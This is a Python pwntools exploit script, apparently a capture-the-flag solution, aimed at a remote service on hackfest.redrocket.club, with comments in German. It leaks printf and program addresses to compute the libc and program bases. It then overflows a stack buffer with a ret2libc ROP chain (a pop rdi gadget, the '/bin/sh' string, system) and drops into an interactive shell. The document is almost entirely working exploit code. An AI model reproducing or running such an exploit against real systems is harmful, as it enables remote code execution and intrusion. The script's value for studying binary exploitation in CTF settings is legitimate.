#!/usr/bin/env python3
import struct
from pwn import *

context(arch = 'amd64', os = 'linux')
r = remote('hackfest.redrocket.club', 1345)
#r = remote('localhost', 6666)


print(r.recvline())


a32 = b"A" * 32
a8 = b"A" * 8
a2 = b"A" * 2

r.send(2*a8)

printfAddress = r.recv()
printfAddress = printfAddress[15:-1]

print(printfAddress)
printfAddress = int(printfAddress, 16)
print(printfAddress)
libcBasis = printfAddress - 0x64e80

print("-------------------------------------------")

res1 = r.recv()
print(res1)
offsetProg = 0x000056475ed4a230 -  0x000056475ed49000 # Werte aus meinen Debug run
addres230 = res1[len(2*a8):]
print(addres230.hex())
addres230 = int.from_bytes(addres230, "little")
print(addres230)
progBasis = addres230 - offsetProg

gadget = 0x0000000000001293 #0x000056475ed4a293 -    0x000056475ed49000    #Wert fuer 293 gadget addresse aus meinen Debug run
gadget = progBasis + gadget


print(r.recv())
print("Restart ------------------------------------")

r.send(a32)
res1 = r.recv()
print(res1)
print(r.recv())
print("------------------------------------")

msg1 = res1 + b"B"* 3
r.send(msg1)
res2 = r.recv()
print(res2)
print(r.recv())
print("------------------------------------")

msg2 = res2 + b"B"* 8
r.send(msg2)
res3 = r.recv()
print(res3)
print(r.recv())
print("------------------------------------")


system = libcBasis + 0x4f440
binSh = libcBasis + 0x1b3e9a

# nun main ret adresse ueberschreiben mit gaget
# dann binsh string "pushen" + stuff fuer rbp
# dann system addresse "pushen"

gadget = 0xdc385     #aus Libc pop rdi; pop rbp; ret;
gadget = libcBasis + gadget

result = msg2 + struct.pack("<Q", gadget) + struct.pack("<Q", binSh) + struct.pack("<Q", 0)  + struct.pack("<Q", system)


result = result.replace(b"B", b"\0")
r.send(result)
print("Result: " + str(result))
res4 = r.recv()
print(res4)
print(r.recv())
print("------------------------------------")


r.sendline()
print(r.recv())
print(r.recv())
r.interactive()
